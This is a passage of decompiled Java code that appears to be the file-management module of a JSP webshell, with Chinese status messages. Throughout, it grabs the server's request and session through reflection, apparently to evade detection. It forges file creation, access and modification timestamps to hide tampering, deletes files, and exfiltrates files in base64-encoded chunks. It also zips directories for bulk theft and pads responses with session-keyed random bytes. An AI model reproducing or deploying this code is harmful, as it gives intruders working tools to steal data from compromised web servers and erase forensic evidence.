                result.put("status", "fail");
                result.put("msg", "文件" + path + "存在，但是删除失败.");
            }
        } else {
            result.put("status", "fail");
            result.put("msg", "文件不存在.");
        }
        return result;
    }

    private String getTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        Map<String, String> timeStampObj = new HashMap<>();
        if (f.exists()) {
            getClass();
            Class<?> cls = Class.forName("java.nio.file.Files");
            getClass();
            Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributes");
            getClass();
            Class<?> cls3 = Class.forName("java.nio.file.Paths");
            Object file = cls3.getMethod("get", String.class, String[].class).invoke(cls3.getClass(), path, new String[0]);
            Object attrs = cls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(cls, file, cls2, new LinkOption[0]);
            Class<?> cls4 = Class.forName("java.nio.file.attribute.FileTime");
            Object createTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("creationTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastAccessTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastAccessTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            Object lastModifiedTime = cls4.getMethod("toMillis", new Class[0]).invoke(cls2.getMethod("lastModifiedTime", new Class[0]).invoke(attrs, new Object[0]), new Object[0]);
            String createTimeStamp2 = df.format(new Date(((Long) createTime).longValue()));
            String lastAccessTimeStamp = df.format(new Date(((Long) lastAccessTime).longValue()));
            String lastModifiedTimeStamp = df.format(new Date(((Long) lastModifiedTime).longValue()));
            timeStampObj.put("createTime", createTimeStamp2);
            timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
            timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
            String result = buildJson(timeStampObj, true);
            return result;
        }
        throw new Exception("文件不存在");
    }

    private boolean isWindows() {
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
            return true;
        }
        return false;
    }

    private String updateTimeStamp() throws Exception {
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        if (f.exists()) {
            f.setLastModified(df.parse(modifyTimeStamp).getTime());
            if (!isOldJava()) {
                Class<?> cls = Class.forName("java.nio.file.Paths");
                Class<?> cls2 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                Class<?> cls3 = Class.forName("java.nio.file.attribute.FileTime");
                Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
                Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), cls.getMethod("get", String.class, String[].class).invoke(cls.getClass(), path, new String[0]), cls2, new LinkOption[0]);
                Object createTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(createTimeStamp).getTime()));
                Object accessTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(accessTimeStamp).getTime()));
                Object modifyTime = cls3.getMethod("fromMillis", Long.TYPE).invoke(cls3, Long.valueOf(df.parse(modifyTimeStamp).getTime()));
                cls2.getMethod("setTimes", cls3, cls3, cls3).invoke(attributes, modifyTime, accessTime, createTime);
            }
            return "时间戳修改成功。";
        }
        throw new Exception("文件不存在");
    }

    private String downloadPart(String path2, long blockIndex2, long blockSize2) throws Exception {
        int size;
        FileChannel ch = (FileChannel) sessionGetAttribute(this.Session, path2);
        if (ch == null) {
            FileInputStream fis = new FileInputStream(path2);
            ch = fis.getChannel();
            sessionSetAttribute(this.Session, "fis", fis);
            sessionSetAttribute(this.Session, path2, ch);
        }
        ByteBuffer buffer = ByteBuffer.allocate((int) blockSize2);
        synchronized (ch) {
            ch.position(blockIndex2 * blockSize2);
            size = ch.read(buffer);
        }
        byte[] content2 = new byte[size];
        System.arraycopy(buffer.array(), 0, content2, 0, size);
        return base64encode(content2);
    }

    private static void zipFile(String srcDir, boolean KeepDirStructure) throws Exception {
        File file = new File(srcDir);
        String fileName = file.getName();
        FileOutputStream out = new FileOutputStream(new File(srcDir).getParentFile().getAbsolutePath() + File.separator + fileName + ".zip");
        System.currentTimeMillis();
        ZipOutputStream zos = null;
        try {
            try {
                zos = new ZipOutputStream(out);
                File sourceFile = new File(srcDir);
                compress(sourceFile, zos, sourceFile.getName(), KeepDirStructure);
                System.currentTimeMillis();
                if (zos != null) {
                    try {
                        zos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e2) {
                throw new RuntimeException("zip error from ZipUtils", e2);
            }
        } catch (Throwable th) {
            if (zos != null) {
                try {
                    zos.close();
                } catch (IOException e3) {
                    e3.printStackTrace();
                }
            }
            throw th;
        }
    }

    private static void compress(File sourceFile, ZipOutputStream zos, String name, boolean KeepDirStructure) throws Exception {
        byte[] buf = new byte[102400];
        if (sourceFile.isFile()) {
            zos.putNextEntry(new ZipEntry(name));
            FileInputStream in = new FileInputStream(sourceFile);
            while (true) {
                int len = in.read(buf);
                if (len != -1) {
                    zos.write(buf, 0, len);
                } else {
                    zos.closeEntry();
                    in.close();
                    return;
                }
            }
        } else {
            File[] listFiles = sourceFile.listFiles();
            if (listFiles == null || listFiles.length == 0) {
                if (KeepDirStructure) {
                    zos.putNextEntry(new ZipEntry(name + "/"));
                    zos.closeEntry();
                    return;
                }
                return;
            }
            for (File file : listFiles) {
                if (KeepDirStructure) {
                    compress(file, zos, name + "/" + file.getName(), KeepDirStructure);
                } else {
                    compress(file, zos, file.getName(), KeepDirStructure);
                }
            }
        }
    }

    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class<?> cls = Class.forName("java.util.Base64");
                    Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private byte[] base64decode(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            getClass();
            Class<?> cls = Class.forName("java.util.Base64");
            Object Decoder = cls.getMethod("getDecoder", null).invoke(cls, null);
            result = (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        } else {
            getClass();
            Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
            result = (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
        }
        return result;
    }

    private static String base64encode(String content2) throws Exception {
        String result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2.getBytes("UTF-8"));
        } else {
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2.getBytes("UTF-8"));
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private static String base64encode(byte[] content2) throws Exception {
        String result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            Class<?> cls = Class.forName("java.util.Base64");
            Object Encoder = cls.getMethod("getEncoder", null).invoke(cls, null);
            result = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, content2);
        } else {
            Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
            String result2 = (String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, content2);
            result = result2.replace("\n", "").replace("\r", "");
        }
        return result;
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private byte[] getMagic() throws Exception {
        String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
        int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
        Random random = new Random();
        byte[] buf = new byte[magicNum];
        for (int i = 0; i < buf.length; i++) {
            buf[i] = (byte) random.nextInt(256);
        }
        return buf;
    }

    private Object sessionGetAttribute(Object session, String key) {
        Object result = null;
        try {
            result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
        }
        return result;
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }
}
